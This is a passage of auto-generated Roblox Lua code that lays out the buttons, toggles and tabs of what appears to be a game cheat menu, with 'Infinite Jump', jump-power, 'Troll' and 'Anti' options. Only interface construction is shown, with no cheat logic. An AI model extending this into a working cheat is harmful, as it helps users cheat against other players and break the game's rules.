G2L["1a1"]["PlaceholderText"] = [[(50)]];
G2L["1a1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a1"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1a1"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.textbox.outlineStroke
G2L["1a2"] = Instance.new("UIStroke", G2L["1a1"]);
G2L["1a2"]["Thickness"] = 2;
G2L["1a2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1a2"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.textbox.buttonFade
G2L["1a3"] = Instance.new("CanvasGroup", G2L["1a1"]);
G2L["1a3"]["BorderSizePixel"] = 0;
G2L["1a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a3"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.textbox.buttonFade.UIGradient
G2L["1a4"] = Instance.new("UIGradient", G2L["1a3"]);
G2L["1a4"]["Rotation"] = 90;
G2L["1a4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.Jumppower.JumppowerChanger.textbox.text
G2L["1a5"] = Instance.new("UIStroke", G2L["1a1"]);
G2L["1a5"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump
G2L["1a6"] = Instance.new("Frame", G2L["164"]);
G2L["1a6"]["BorderSizePixel"] = 0;
G2L["1a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a6"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1a6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a6"]["Name"] = [[InfJump]];
G2L["1a6"]["LayoutOrder"] = 5;
G2L["1a6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button
G2L["1a7"] = Instance.new("TextButton", G2L["1a6"]);
G2L["1a7"]["BorderSizePixel"] = 0;
G2L["1a7"]["TextTransparency"] = 1;
G2L["1a7"]["TextSize"] = 14;
G2L["1a7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a7"]["ZIndex"] = 50;
G2L["1a7"]["BackgroundTransparency"] = 1;
G2L["1a7"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a7"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button.UIPadding
G2L["1a8"] = Instance.new("UIPadding", G2L["1a7"]);
G2L["1a8"]["PaddingTop"] = UDim.new(0, 3);
G2L["1a8"]["PaddingRight"] = UDim.new(0, 3);
G2L["1a8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1a8"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button.toggleFrame
G2L["1a9"] = Instance.new("Frame", G2L["1a7"]);
G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1a9"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1a9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1a9"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button.toggleFrame.outlineStroke
G2L["1aa"] = Instance.new("UIStroke", G2L["1a9"]);
G2L["1aa"]["Thickness"] = 2;
G2L["1aa"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button.toggleFrame.toggleFade
G2L["1ab"] = Instance.new("CanvasGroup", G2L["1a9"]);
G2L["1ab"]["BorderSizePixel"] = 0;
G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ab"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ab"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.button.toggleFrame.toggleFade.UIGradient
G2L["1ac"] = Instance.new("UIGradient", G2L["1ab"]);
G2L["1ac"]["Rotation"] = 90;
G2L["1ac"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.text
G2L["1ad"] = Instance.new("TextLabel", G2L["1a6"]);
G2L["1ad"]["TextWrapped"] = true;
G2L["1ad"]["ZIndex"] = 10;
G2L["1ad"]["BorderSizePixel"] = 0;
G2L["1ad"]["TextSize"] = 14;
G2L["1ad"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["BackgroundTransparency"] = 1;
G2L["1ad"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["1ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ad"]["Text"] = [[Infinite Jump]];
G2L["1ad"]["Name"] = [[text]];
G2L["1ad"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.text.UIPadding
G2L["1ae"] = Instance.new("UIPadding", G2L["1ad"]);
G2L["1ae"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.text.text
G2L["1af"] = Instance.new("UIStroke", G2L["1ad"]);
G2L["1af"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.InfJump.UIPadding
G2L["1b0"] = Instance.new("UIPadding", G2L["1a6"]);
G2L["1b0"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.UIListLayout
G2L["1b1"] = Instance.new("UIListLayout", G2L["142"]);
G2L["1b1"]["Padding"] = UDim.new(0, 5);
G2L["1b1"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.greystroke
G2L["1b2"] = Instance.new("UIStroke", G2L["3e"]);
G2L["1b2"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1b2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1b2"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll
G2L["1b3"] = Instance.new("ScrollingFrame", G2L["3e"]);
G2L["1b3"]["Visible"] = false;
G2L["1b3"]["Active"] = true;
G2L["1b3"]["BorderSizePixel"] = 0;
G2L["1b3"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["1b3"]["Name"] = [[Troll]];
G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["1b3"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["ScrollBarThickness"] = 0;
G2L["1b3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside
G2L["1b4"] = Instance.new("Frame", G2L["1b3"]);
G2L["1b4"]["BorderSizePixel"] = 0;
G2L["1b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b4"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1b4"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["1b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b4"]["Name"] = [[rightside]];
G2L["1b4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.rightside.UIListLayout
G2L["1b5"] = Instance.new("UIListLayout", G2L["1b4"]);
G2L["1b5"]["Padding"] = UDim.new(0, 5);
G2L["1b5"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside
G2L["1b6"] = Instance.new("Frame", G2L["1b3"]);
G2L["1b6"]["BorderSizePixel"] = 0;
G2L["1b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1b6"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["1b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b6"]["Name"] = [[leftside]];
G2L["1b6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Troll.leftside.UIListLayout
G2L["1b7"] = Instance.new("UIListLayout", G2L["1b6"]);
G2L["1b7"]["Padding"] = UDim.new(0, 5);
G2L["1b7"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain
G2L["1b8"] = Instance.new("ScrollingFrame", G2L["3e"]);
G2L["1b8"]["Visible"] = false;
G2L["1b8"]["Active"] = true;
G2L["1b8"]["BorderSizePixel"] = 0;
G2L["1b8"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["1b8"]["Name"] = [[TCOMain]];
G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b8"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["1b8"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b8"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b8"]["ScrollBarThickness"] = 0;
G2L["1b8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside
G2L["1b9"] = Instance.new("Frame", G2L["1b8"]);
G2L["1b9"]["BorderSizePixel"] = 0;
G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b9"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["1b9"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["1b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b9"]["Name"] = [[rightside]];
G2L["1b9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.UIListLayout
G2L["1ba"] = Instance.new("UIListLayout", G2L["1b9"]);
G2L["1ba"]["Padding"] = UDim.new(0, 5);
G2L["1ba"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab
G2L["1bb"] = Instance.new("Frame", G2L["1b9"]);
G2L["1bb"]["BorderSizePixel"] = 0;
G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["1bb"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["1bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bb"]["Name"] = [[antiTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======
G2L["1bc"] = Instance.new("Frame", G2L["1bb"]);
G2L["1bc"]["BorderSizePixel"] = 0;
G2L["1bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bc"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["1bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bc"]["Name"] = [[======ACCENT======]];
G2L["1bc"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor
G2L["1bd"] = Instance.new("Frame", G2L["1bc"]);
G2L["1bd"]["BorderSizePixel"] = 0;
G2L["1bd"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["1bd"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["1bd"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["1bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bd"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======ACCENT======.GuiColor.UICorner
G2L["1be"] = Instance.new("UICorner", G2L["1bd"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======
G2L["1bf"] = Instance.new("Frame", G2L["1bb"]);
G2L["1bf"]["BorderSizePixel"] = 0;
G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1bf"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bf"]["Name"] = [[======TITLE======]];
G2L["1bf"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text
G2L["1c0"] = Instance.new("TextLabel", G2L["1bf"]);
G2L["1c0"]["TextWrapped"] = true;
G2L["1c0"]["BorderSizePixel"] = 0;
G2L["1c0"]["TextSize"] = 14;
G2L["1c0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1c0"]["TextTransparency"] = 0.3;
G2L["1c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c0"]["BackgroundTransparency"] = 1;
G2L["1c0"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c0"]["Text"] = [[Anti]];
G2L["1c0"]["Name"] = [[text]];
G2L["1c0"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.text
G2L["1c1"] = Instance.new("UIStroke", G2L["1c0"]);
G2L["1c1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.text.UIPadding
G2L["1c2"] = Instance.new("UIPadding", G2L["1c0"]);
G2L["1c2"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.======TITLE======.minimise
G2L["1c3"] = Instance.new("TextButton", G2L["1bf"]);
G2L["1c3"]["BorderSizePixel"] = 0;
G2L["1c3"]["TextTransparency"] = 0.3;
G2L["1c3"]["TextSize"] = 14;
G2L["1c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c3"]["BackgroundTransparency"] = 1;
G2L["1c3"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["1c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c3"]["Text"] = [[-]];
G2L["1c3"]["Name"] = [[minimise]];
G2L["1c3"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan
G2L["1c4"] = Instance.new("Frame", G2L["1bb"]);
G2L["1c4"]["BorderSizePixel"] = 0;
G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c4"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1c4"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c4"]["Name"] = [[maptidenan]];
G2L["1c4"]["LayoutOrder"] = 2;
G2L["1c4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button
G2L["1c5"] = Instance.new("TextButton", G2L["1c4"]);
G2L["1c5"]["BorderSizePixel"] = 0;
G2L["1c5"]["TextTransparency"] = 1;
G2L["1c5"]["TextSize"] = 14;
G2L["1c5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c5"]["BackgroundTransparency"] = 1;
G2L["1c5"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.UIPadding
G2L["1c6"] = Instance.new("UIPadding", G2L["1c5"]);
G2L["1c6"]["PaddingTop"] = UDim.new(0, 3);
G2L["1c6"]["PaddingRight"] = UDim.new(0, 3);
G2L["1c6"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1c6"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame
G2L["1c7"] = Instance.new("Frame", G2L["1c5"]);
G2L["1c7"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1c7"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1c7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1c7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1c7"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.outlineStroke
G2L["1c8"] = Instance.new("UIStroke", G2L["1c7"]);
G2L["1c8"]["Thickness"] = 2;
G2L["1c8"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade
G2L["1c9"] = Instance.new("CanvasGroup", G2L["1c7"]);
G2L["1c9"]["BorderSizePixel"] = 0;
G2L["1c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c9"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade.UIGradient
G2L["1ca"] = Instance.new("UIGradient", G2L["1c9"]);
G2L["1ca"]["Rotation"] = 90;
G2L["1ca"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text
G2L["1cb"] = Instance.new("TextLabel", G2L["1c4"]);
G2L["1cb"]["TextWrapped"] = true;
G2L["1cb"]["BorderSizePixel"] = 0;
G2L["1cb"]["TextSize"] = 14;
G2L["1cb"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["BackgroundTransparency"] = 1;
G2L["1cb"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["Text"] = [[Anti Maptide NaN]];
G2L["1cb"]["Name"] = [[text]];
G2L["1cb"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.UIPadding
G2L["1cc"] = Instance.new("UIPadding", G2L["1cb"]);
G2L["1cc"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.text
G2L["1cd"] = Instance.new("UIStroke", G2L["1cb"]);
G2L["1cd"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.UIPadding
G2L["1ce"] = Instance.new("UIPadding", G2L["1c4"]);
G2L["1ce"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
G2L["1cf"] = Instance.new("Frame", G2L["1bb"]);
G2L["1cf"]["BorderSizePixel"] = 0;
G2L["1cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cf"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["1cf"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cf"]["Name"] = [[---DIVIDER---]];
G2L["1cf"]["LayoutOrder"] = 3;
G2L["1cf"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["1d0"] = Instance.new("Frame", G2L["1cf"]);
G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1d0"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1d0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1d0"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["1d1"] = Instance.new("UIStroke", G2L["1d0"]);
G2L["1d1"]["Thickness"] = 2;
G2L["1d1"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["1d2"] = Instance.new("CanvasGroup", G2L["1d0"]);
G2L["1d2"]["BorderSizePixel"] = 0;
G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d2"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["1d3"] = Instance.new("UIGradient", G2L["1d2"]);
G2L["1d3"]["Rotation"] = 90;
G2L["1d3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["1d4"] = Instance.new("UIStroke", G2L["1d0"]);
G2L["1d4"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1d4"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["1d5"] = Instance.new("UICorner", G2L["1d0"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
G2L["1d6"] = Instance.new("UIPadding", G2L["1cf"]);
G2L["1d6"]["PaddingTop"] = UDim.new(0, 3);
G2L["1d6"]["PaddingRight"] = UDim.new(0, 6);
G2L["1d6"]["PaddingLeft"] = UDim.new(0, 6);
G2L["1d6"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual
G2L["1d7"] = Instance.new("Frame", G2L["1bb"]);
G2L["1d7"]["BorderSizePixel"] = 0;
G2L["1d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d7"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1d7"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d7"]["Name"] = [[visual]];
G2L["1d7"]["LayoutOrder"] = 2;
G2L["1d7"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button
G2L["1d8"] = Instance.new("TextButton", G2L["1d7"]);
G2L["1d8"]["BorderSizePixel"] = 0;
G2L["1d8"]["TextTransparency"] = 1;
G2L["1d8"]["TextSize"] = 14;
G2L["1d8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d8"]["BackgroundTransparency"] = 1;
G2L["1d8"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d8"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.UIPadding
G2L["1d9"] = Instance.new("UIPadding", G2L["1d8"]);
G2L["1d9"]["PaddingTop"] = UDim.new(0, 3);
G2L["1d9"]["PaddingRight"] = UDim.new(0, 3);
G2L["1d9"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1d9"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame
G2L["1da"] = Instance.new("Frame", G2L["1d8"]);
G2L["1da"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1da"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1da"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1da"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1da"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.outlineStroke
G2L["1db"] = Instance.new("UIStroke", G2L["1da"]);
G2L["1db"]["Thickness"] = 2;
G2L["1db"]["Name"] = [[outlineStroke]];


